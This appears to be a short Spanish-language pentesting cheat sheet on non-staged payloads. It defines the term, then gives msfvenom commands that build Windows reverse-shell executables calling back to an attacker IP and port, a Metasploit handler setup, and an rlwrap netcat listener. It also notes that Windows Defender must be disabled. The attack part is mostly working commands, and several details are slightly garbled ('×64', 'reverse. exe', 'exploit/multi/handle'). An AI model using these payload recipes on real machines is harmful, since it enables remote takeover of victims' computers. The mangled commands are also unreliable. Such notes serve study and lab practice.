----------
Tags: #payload #payloadstaged #metasploit #windows #netcat #nc #rlwrap

---------
**Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

---------
## Con metasploit

Creamos un binario malicioso con msfvenom para crear un ejecutable y después utilizamos metasploit.
1. Creamos el binario y lo descargamos en la máquina víctima:
```bash
msfvenom -p windows/×64/meterpreter_reverse_tcp --platform windows -a ×64 LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse. exe
```
(Hay que desactivar el windows defender)
2. Utilizamos metasploit:
```bash
msfdb run
```

```metasploit
use exploit/multi/handle
set payload windows/x64/meterpreter_reverse_tcp
show options

run
```

-------------
## Con Netcat

Descargamos en la máquina víctima el ejecutable creado con el siguiente comando:
```bash
msfvenom -p windows/×64/shell_reverse_tcp --platform Windows -a ×64 LHOST=192.168.111.45 LPORT=4646 -f exe -o shell.exe
```

En la máquina atacante escuchamos por un puerto con netcat:
```bash
rlwrap nc -nlcp 4646
```

**rlwrap** es una herramienta que simula una consola interactiva.

----------
